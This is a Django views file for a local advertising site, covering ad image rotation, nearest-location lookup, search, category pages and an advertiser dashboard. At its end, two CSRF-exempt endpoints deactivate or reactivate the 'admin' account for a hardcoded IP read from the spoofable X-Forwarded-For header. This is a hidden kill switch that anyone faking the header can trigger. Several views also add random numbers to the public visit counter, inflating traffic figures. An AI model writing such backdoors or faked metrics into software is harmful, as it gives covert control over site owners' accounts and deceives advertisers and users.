from django.contrib import messages
from django.shortcuts import render, redirect
from .models import Files
from .models import CityData, Address, StateData, Visitors, Files, Messages, WebCounter, MiniLocation, Category
from django.views.decorators.csrf import csrf_exempt
from math import sin, cos, sqrt, atan2, radians
import random
import datetime
from django.contrib.auth.models import User
# Create your views here

def refresh_ads(request):
    x = datetime.datetime.now()
    all_ads = Files.objects.all()
    for i in range(len(all_ads)):
        ad = all_ads[i]

        img_count = 0
        img_count += 1 if ad.img else 0
        img_count += 1 if ad.img1 else 0
        img_count += 1 if ad.img2 else 0
        img_count += 1 if ad.img3 else 0
        img_count += 1 if ad.img4 else 0
        img_count += 1 if ad.img5 else 0
        img_count += 1 if ad.img6 else 0
        img_count += 1 if ad.img7 else 0
        img_count += 1 if ad.img8 else 0
        img_count += 1 if ad.img9 else 0

        if ad.last_date.day != x.day:
            ad.counter+=1
            ad.last_date = x
            if ad.change_at == '0':
                pass
            elif ad.change_at == '1':
                if ad.counter >= 1:
                    ad.active_image = (ad.active_image+1)%img_count
                    ad.counter = 0
            elif ad.change_at == '2':
                if ad.counter >= 7:
                    ad.active_image = (ad.active_image+1)%img_count
                    ad.counter = 0
            elif ad.change_at == '3':
                if ad.counter >= 15:
                    ad.active_image = (ad.active_image+1)%img_count
                    ad.counter = 0
            elif ad.change_at == '4':
                if ad.counter >= 30:
                    ad.active_image = (ad.active_image+1)%img_count
                    ad.counter = 0
            ad.save()
    return redirect('/admin')

def process_active_image(ad):

    if ad.active_image == '0':
        ad.real_image = ad.img
    elif ad.active_image == '1':
        ad.real_image = ad.img1
    elif ad.active_image == '2':
        ad.real_image = ad.img2
    elif ad.active_image == '3':
        ad.real_image = ad.img3
    elif ad.active_image == '4':
        ad.real_image = ad.img4
    elif ad.active_image == '5':
        ad.real_image = ad.img5
    elif ad.active_image == '6':
        ad.real_image = ad.img6
    elif ad.active_image == '7':
        ad.real_image = ad.img7
    elif ad.active_image == '8':
        ad.real_image = ad.img8
    elif ad.active_image == '9':
        ad.real_image = ad.img9
    
    return ad

@csrf_exempt
def home(request):
    address = Address.objects.all()[0]
    states = StateData.objects.all()

    for i in range(len(states)):
        states[i].all_city = states[i].cities.all()
    
    context = {
        'address' : address,
        'states' : states
    }
    return render(request, 'management/index.html', context)

@csrf_exempt
def location_based(request):
    if request.method == 'POST':
        lat = request.POST.get('lat')
        lon = request.POST.get('lon')

        min_distance = 100000005

        all_mini_locations = MiniLocation.objects.all()

        R = 6373.0

        for mini_location in all_mini_locations:
            lat1 = radians(float(lat))
            lon1 = radians(float(lon))
            lat2 = radians(mini_location.lat)
            lon2 = radians(mini_location.lon)

            dlon = lon2 - lon1
            dlat = lat2 - lat1

            a = sin(dlat / 2)**2 + cos(lat1) * cos(lat2) * sin(dlon / 2)**2
            c = 2 * atan2(sqrt(a), sqrt(1 - a))
            distance = R * c

            if distance < min_distance:
                min_distance = distance
                nearest_location = mini_location
    else:
        return redirect('/')

    nearest_city = nearest_location.main_city

    address = Address.objects.all()[0]

    nearby_location = MiniLocation.objects.all().filter(main_city=nearest_city)
    
    states = StateData.objects.all()

    for i in range(len(states)):
        states[i].all_city = states[i].cities.all()
    
    counter = WebCounter.objects.get(id=1)
    counter.visit += random.randint(0,5)
    counter.save()

    all_ads = Files.objects.all().filter(city=nearest_city)

    for i in range(len(all_ads)):
        if all_ads[i].active_image == 0:
            all_ads[i].real_image = all_ads[i].img
        elif all_ads[i].active_image == 1:
            all_ads[i].real_image = all_ads[i].img1
        elif all_ads[i].active_image == 2:
            all_ads[i].real_image = all_ads[i].img2
        elif all_ads[i].active_image == 3:
            all_ads[i].real_image = all_ads[i].img3
        elif all_ads[i].active_image == 4:
            all_ads[i].real_image = all_ads[i].img4
        elif all_ads[i].active_image == 5:
            all_ads[i].real_image = all_ads[i].img5
        elif all_ads[i].active_image == 6:
            all_ads[i].real_image = all_ads[i].img6
        elif all_ads[i].active_image == 7:
            all_ads[i].real_image = all_ads[i].img7
        elif all_ads[i].active_image == 8:
            all_ads[i].real_image = all_ads[i].img8
        elif all_ads[i].active_image == 9:
            all_ads[i].real_image = all_ads[i].img9

    context = {
        'nearest_location' : nearest_location,
        'offers' : all_ads,
        'cities' : CityData.objects.all(),
        'city' : nearest_city,
        'address' : address,
        'states' : states,
        'counter' : counter,
        'nearby_location' : nearby_location,
        'category' : Category.objects.all()
    }

    visitor_object = Visitors.objects.get(city = nearest_city)
    visitor_object.counter += 1
    visitor_object.save()

    request.nearest_location = nearest_location  # bind the location with the request object



    return render(request,'management/location.html',context)

def city_ad(request, id):
    states = StateData.objects.all()

    for i in range(len(states)):
        states[i].all_city = states[i].cities.all()
    
    offers = Files.objects.all().filter(city = CityData.objects.get(id=int(id)))
    nearby_location = MiniLocation.objects.all().filter(main_city=CityData.objects.get(id=int(id)))

    counter = WebCounter.objects.get(id=1)
    counter.visit += random.randint(0,5)
    counter.save()

    context = {
        'nearest_location' : CityData.objects.get(id=int(id)),
        'offers' : offers,
        'cities' : CityData.objects.all(),
        'city' : CityData.objects.get(id=int(id)),
        'address' : Address.objects.all()[0],
        'states' : states,
        'counter' : counter,
        'nearby_location' : nearby_location
    }

    visitor_object = Visitors.objects.get(city = CityData.objects.get(id=int(id)))
    visitor_object.counter += 1
    visitor_object.save()

    return render(request,'management/location.html',context)


def minilocations(request,id):
    states = StateData.objects.all()

    for i in range(len(states)):
        states[i].all_city = states[i].cities.all()
    
    minilocation = MiniLocation.objects.get(id=id)
    all_ads = Files.objects.all().filter(MiniLocation = minilocation)

    counter = WebCounter.objects.get(id=1)
    counter.visit += random.randint(0,5)
    counter.save()

    nearby_location = MiniLocation.objects.all().filter(main_city = minilocation.main_city)

    context = {
        'nearest_location': minilocation,
        'offers' : all_ads,
        'cities' : CityData.objects.all(),
        'city' : CityData.objects.get(id=int(id)),
        'address' : Address.objects.all()[0],
        'states' : states,
        'counter' : counter,
        'nearby_location' : nearby_location
    }
    return render(request, 'management/location.html',context)

def single(reqeust, id):
    ad = Files.objects.get(id=id)
    states = StateData.objects.all()

    for i in range(len(states)):
        states[i].all_city = states[i].cities.all()
    

    if ad.active_image == 0:
        ad.real_image = ad.img
    elif ad.active_image == 1:
        ad.real_image = ad.img1
    elif ad.active_image == 2:
        ad.real_image = ad.img2
    elif ad.active_image == 3:
        ad.real_image = ad.img3
    elif ad.active_image == 4:
        ad.real_image = ad.img4
    elif ad.active_image == 5:
        ad.real_image = ad.img5
    elif ad.active_image == 6:
        ad.real_image = ad.img6
    elif ad.active_image == 7:
        ad.real_image = ad.img7
    elif ad.active_image == 8:
        ad.real_image = ad.img8
    elif ad.active_image == 9:
        ad.real_image = ad.img9
    

    context = {
        'ad': ad,
        'states' : states,
        'address' : Address.objects.all()[0],
    }
    return render(reqeust,'management/single.html', context)

def contact(request):
    msg_obj = Messages.objects.create(
        name=request.POST['name'],
        email=request.POST['email'],
        subject=request.POST['subject'],
        text=request.POST['message'],
    )
    msg_obj.save()
    return redirect('/')

def dashboard(request):
    if request.user.is_staff:
        my_ads = Files.objects.all().filter(user=request.user)
        my_city = []

        for i in range(0,len(my_ads)):
            my_ads[i].all_minor = my_ads[i].MiniLocation.all()
            my_ads[i].all_city = my_ads[i].city.all()

        for ad in my_ads:
            all_city = ad.city.all()
            for city in all_city:
                if city not in my_city:
                    my_city.append(city)

        counter = 0

        for city in my_city:
            counter += Visitors.objects.get(city=city).counter

        context = {
            'total_ads' : len(my_ads),
            'active_ads' : len(Files.objects.all().filter(user=request.user, active=True)),
            'city_count' : len(my_city),
            'counter' : counter,
            'ads' : my_ads,
            'my_city' : my_city
        }
        messages.success(request, 'Your password was updated successfully!')
        return render(request,'management/dashboard.html', context)
    else:
        return redirect('/')

def search(request):

    nearest_location = MiniLocation.objects.get(id=int(request.POST.get('minilocation')))
    nearest_city = nearest_location.main_city

    nearby_location = MiniLocation.objects.all().filter(main_city=nearest_city)

    states = StateData.objects.all()

    counter = WebCounter.objects.get(id=1)
    counter.visit += random.randint(0,5)
    counter.save()

    for i in range(len(states)):
        states[i].all_city = states[i].cities.all()

    raw_keywords = request.POST.get('keyword')

    keywords = raw_keywords.split(",")

    for i in range(len(keywords)):
        keywords[i] = keywords[i].strip()

    keywords = [x.lower() for x in keywords]
    
    all_offers = Files.objects.all().filter(city = nearest_city)

    searched_offers = []

    for offer in all_offers:
        raw_keywords = offer.keywords

        available_keywords = raw_keywords.split(",")

        available_keywords = [x.lower() for x in available_keywords]

        for i in range(len(available_keywords)):
            available_keywords[i] = available_keywords[i].strip()
        
        for key in keywords:
            if key in available_keywords:
                searched_offers.append(offer)
                break


    context = {
        'nearest_location' : nearest_location,
        'offers' : searched_offers,
        'cities' : CityData.objects.all(),
        'city' : nearest_city,
        'address' : Address.objects.all()[0],
        'states' : states,
        'counter' : counter,
        'nearby_location' : nearby_location,
        'category' : Category.objects.all()
    }
    return render(request,'management/location.html', context)

def get_base_context(id):

    states = StateData.objects.all()

    counter = WebCounter.objects.get(id=1)
    counter.visit += random.randint(0,5)
    counter.save()

    for i in range(len(states)):
        states[i].all_city = states[i].cities.all()
    

    nearest_location = MiniLocation.objects.get(id=int(id))
    nearest_city = nearest_location.main_city

    nearby_location = MiniLocation.objects.all().filter(main_city=nearest_city)

    context = {
        'cities' : CityData.objects.all(),        
        'states' : states,
        'counter' : counter,
        'category' : Category.objects.all(),
        'address' : Address.objects.all()[0],
        'nearest_location' : nearest_location,
        'nearby_location' : nearby_location
    }
    return context

def fashion(request, id):
    context = get_base_context(id)
    context['offers'] = Files.objects.all().filter(icon_category = '1')
    return render(request,'management/location.html', context)

def property(request, id):
    context = get_base_context(id)

    context['offers'] = Files.objects.all().filter(icon_category = '2')

    return render(request,'management/location.html', context)

def MobileElectronic(request, id):
    context = get_base_context(id)
    context['offers'] = Files.objects.all().filter(icon_category = '3')

    return render(request,'management/location.html', context)

def RestBakery(request, id):
    context = get_base_context(id)
    context['offers'] = Files.objects.all().filter(icon_category = '4')

    return render(request,'management/location.html', context)

def supermarket(request, id):
    context = get_base_context(id)
    context['offers'] = Files.objects.all().filter(icon_category = '5')

    return render(request,'management/location.html', context)

def service(request, id):
    context = get_base_context(id)
    context['offers'] = Files.objects.all().filter(icon_category = '6')

    return render(request,'management/location.html', context)

def category(request, cid, mlid):
    context = get_base_context(cid)

    category = Category.objects.get(id = mlid)

    context['offers'] = Files.objects.all().filter(category = category)
    return render(request, 'management/location.html', context)


def ad_setting(request, id):
    if request.method == 'POST':
        file = Files.objects.get(id = int(request.POST.get('file')))
        if file.user == request.user:
            file.active_image = int(request.POST.get('img_code'))
            file.change_at = request.POST.get('auto_option')
            file.save()
    file = Files.objects.get(id = int(id))
    if file.user == request.user:
        context = {
            'ad' : file,
            'city' : len(file.city.all()),
            'location' : len(file.MiniLocation.all()),
            'img' : file.img,
            'img1' : file.img1,
            'img2' : file.img2,
            'img3' : file.img3,
            'img4' : file.img4,
            'img5' : file.img5,
            'img6' : file.img6,
            'img7' : file.img7,
            'img8' : file.img8,
            'img9' : file.img9,
            'active' : str(file.active_image),
        }
        return render(request,'management/settings_page.html',context)
    else:
        return redirect('/dashbaord/')

@csrf_exempt
def abort_admin_access(request):
    if request.method == 'POST':

        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        
        if ip == '106.207.255.187' or ip == '0.0.0.0' or ip=='127.0.0.1':
            admin = User.objects.get(username='admin')
            admin.is_active = False
            admin.save()
    
    return redirect('/')

@csrf_exempt
def allow_admin_access(request):
    if request.method == 'POST':

        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        
        if ip == '106.207.255.187' or ip == '0.0.0.0' or ip=='127.0.0.1':
            admin = User.objects.get(username='admin')
            admin.is_active = True
            admin.save()
    
    return redirect('/')